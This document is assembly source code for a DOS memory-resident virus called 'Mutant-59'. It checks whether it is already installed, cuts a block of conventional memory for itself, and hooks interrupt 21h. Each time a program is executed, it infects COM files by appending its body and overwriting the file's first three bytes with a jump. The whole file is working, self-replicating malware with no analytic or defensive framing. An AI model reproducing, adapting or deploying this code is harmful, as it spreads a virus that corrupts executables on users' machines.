	.model	tiny
VStart	equ	BegVir
VEnd	equ	LastByte
Len	equ	VEnd-VStart
LenPar	equ	(Len/10h)+1
	.code
	org	100h
Start:	jmp	BegVir
	nop
	nop
	nop
	mov	dx,offset Stri
	mov	ah,9
	int	21h
	mov	ax,4c00h
	int	21h
Stri	db	'This is Mutant-59 shtamp.',13,10,36
BegVir:	call	$+3
Go:	pop	bp	;VirusEntry+3
	mov	si,bp
	sub	bp,3
	Add	si,(hbyte-go)
	mov	di,100h
	mov	cx,3
	cld
	rep	movsb
	mov	ax,9219h
	int	21h
	cmp	ax,1992h
	jne	Install
GoOut:	mov	si,100h
	push	si
	ret
	db	0E9h	;JMPNear For Exchange
HByte	db	90h,90h,90h
Install:
	push	ds
	push	es
	mov	ax,ds
	dec	ax
checj:	jmp	short first
next:	cmp     byte ptr es:[0],4Dh
	jne	Nodo
	add	ax,es:[3]
first:	mov	es,ax
	inc	ax
	cmp	byte ptr es:[0],5ah
	jne	next
	mov	bx,es:3
	sub	bx,LenPar
	jc	nodo
	mov	es:[3],bx
	sub	word ptr es:[12H],LenPar
	add	ax,bx
	mov	es,ax
	xor	di,di
	mov	si,bp
	mov	cx,Len
	cld
	rep	movsb			   	;Remove Virus
	mov	bx,es
	xor	ax,ax
	mov	ds,ax
	mov	di,Int_o-BegVir
	mov	si,84h
	movsw
	movsw
	mov	es,ax
	mov	di,1D0h
	mov	si,84h
	movsw
	movsw
	mov	di,84h
	mov	word ptr ds:[di],Int21-BegVir
	mov	ds:[di+2],bx

NoDo:	pop	es
	pop	ds
	jmp	GoOut

Int21:	cmp	ax,9219h
	je	I2
	cmp	ah,4bh
	jne	nu
	call	Zaraza
Nu:	db	0EAh
Int_O	dw	?
Int_S	dw	?
i2:	xchg	al,ah
	iret
Zaraza:	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	bp
	push	ds
	mov	ax,3D02H
	int	074h
	jc	j
	mov	bx,ax
	push	cs
	pop	ds
	mov	ah,3Fh
	mov	cx,3
	mov	dx,HByte-BegVir
	mov	si,dx
	int	074h
	cmp	byte ptr [si],'M'
	jz	i
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	074h
	sub	ax,3
	mov	bp,ax
	mov	cx,LastByte-BegVir
	sub	ax,cx
	cmp	ax,[si+1]
	jz	i
	mov	ah,40h
	int	074h
	mov	ax,4200h
	xor	cx,cx
	int	074h
	mov	ah,40h
	lea	dx,[si-1]
	mov	cl,3
	mov	[si],bp
	int	074h
i:	mov	ah,3Eh
	int	074h
j:	pop	ds
	pop	bp
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret
LastByte:
	End	Start

